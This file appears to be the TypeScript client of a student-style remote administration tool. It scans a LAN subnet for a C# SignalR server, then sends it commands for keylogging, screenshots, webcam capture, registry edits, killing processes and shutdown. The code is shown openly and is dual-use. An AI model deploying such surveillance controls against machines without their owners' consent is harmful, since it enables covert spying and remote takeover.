// file: src/services/socketService.ts
import { HubConnection, HubConnectionBuilder, LogLevel } from '@microsoft/signalr';

// Khai báo biến connection để dùng chung
let connection: HubConnection;
const checkIP = async (ip: string): Promise<string | null> => {
    try {
        const controller = new AbortController();
        // Tăng timeout lên 1s (hoặc 1.5s nếu mạng wifi yếu)
        const timeoutId = setTimeout(() => controller.abort(), 1000);

        const response = await fetch(`http://${ip}:5000/api/discovery`, {
            signal: controller.signal,
            method: 'GET',
            mode: 'cors'
        });

        clearTimeout(timeoutId);

        if (response.ok) {
            const data = await response.json();
            if (data.message === "REMOTE_SERVER_HERE") {
                return ip; // Trả về IP ngay khi tìm thấy
            }
        }
    } catch (e) {
        // Lỗi kết nối hoặc timeout -> Bỏ qua
        return null;
    }
    return null;
};

// 2. Kỹ thuật Batching (Chia lô để quét)
export const scanForServer = async (baseIP: string = "192.168.1"): Promise<string | null> => {
    console.log(`Đang quét mạng LAN dải ${baseIP}.x ...`);

    // Chia 255 IP thành các lô, mỗi lô 20 IP
    const BATCH_SIZE = 20;

    for (let i = 1; i < 255; i += BATCH_SIZE) {
        const batchPromises = [];

        // Tạo một lô request
        for (let j = 0; j < BATCH_SIZE; j++) {
            const currentNum = i + j;
            if (currentNum >= 255) break;

            const ip = `${baseIP}.${currentNum}`;
            batchPromises.push(checkIP(ip));
        }

        // Chạy song song lô này và chờ xong mới chạy lô tiếp theo
        // Điều này giúp trình duyệt không bị quá tải
        const results = await Promise.all(batchPromises);

        // Kiểm tra xem trong lô này có IP nào phản hồi không
        const foundIP = results.find(ip => ip !== null);

        if (foundIP) {
            console.log(`✅ Đã tìm thấy Server tại: ${foundIP}`);
            return foundIP; // Tìm thấy là dừng ngay, không quét nữa
        }
    }

    console.log("❌ Không tìm thấy Server nào.");
    return null;
};// Sửa lại hàm initSocket để nhận IP động
export const initSocket = (serverIP: string): HubConnection => {
    const SERVER_URL = `http://${serverIP}:5000/systemHub`;

    console.log(`[SignalR] Đang kết nối tới: ${SERVER_URL}`);

    connection = new HubConnectionBuilder()
        .withUrl(SERVER_URL)
        .withAutomaticReconnect()
        .configureLogging(LogLevel.Information)
        .build();

    connection.start()
        .then(() => {
            console.log('[SignalR] Kết nối thành công tới Server C#!');
            // alert("Kết nối thành công!"); // Có thể mở dòng này nếu muốn test
        })
        .catch((err) => {
            console.error('[SignalR] Lỗi kết nối:', err);
            // --- THÊM DÒNG NÀY ĐỂ NÓ BÁO LỖI RA MÀN HÌNH ---
            alert("KHÔNG KẾT NỐI ĐƯỢC!\nLỗi chi tiết: " + err.toString());
        });
    return connection;
};

// Hàm lấy connection hiện tại (để các component khác dùng)
export const getSocket = () => connection;

/**
 * Hàm gửi lệnh sang C#
 * @param action Tên hành động (ví dụ: "start_keylog")
 * @param payload Dữ liệu kèm theo (ví dụ: ID process cần kill)
 */
export const sendCommand = async (action: string, payload?: any) => {
    if (!connection) throw new Error("Chưa kết nối tới Server!");

    try {
        console.log(`[Gửi lệnh] ${action}`, payload);

        // Ánh xạ từ tên lệnh của Client sang tên hàm trong SystemHub.cs của Server
        switch (action) {
            case 'start_keylog':
                await connection.invoke("StartKeylog");
                break;
            case 'stop_keylog':
                await connection.invoke("StopKeylog");
                break;
            case 'take_screenshot':
                await connection.invoke("TakeScreenshot");
                break;
            case 'shutdown':
                await connection.invoke("ShutdownServer");
                break;
            case 'restart':
                await connection.invoke("RestartServer");
                break;
            case 'list_processes':
                await connection.invoke("GetProcesses");
                break;
            case 'kill_process':
                // payload ở đây sẽ là PID (số)
                await connection.invoke("KillProcess", Number(payload));
                break;
            case 'start_app':
                // Payload chính là tên App (ví dụ: "notepad.exe")
                await connection.invoke("StartApp", String(payload));
                break;
            // Registry (nếu payload là object chứa thông tin registry)
            case 'registry_command':
                if (payload) {
                    await connection.invoke("SendRegistryCommand",
                        payload.action, payload.link, payload.valueName, payload.value, payload.typeValue
                    );
                }
                break;
            case 'get_webcams':
                await connection.invoke("GetWebcams");
                break;
            case 'start_webcam':
                // payload ở đây là index của camera (số 0, 1, 2...)
                await connection.invoke("StartWebcam", Number(payload));
                break;

            case 'stop_webcam':
                await connection.invoke("StopWebcam");
                break;
            default:
                console.warn("Lệnh không được hỗ trợ:", action);
        }
    } catch (err) {
        console.error(`Lỗi khi gửi lệnh ${action}:`, err);
        throw err;
    }
};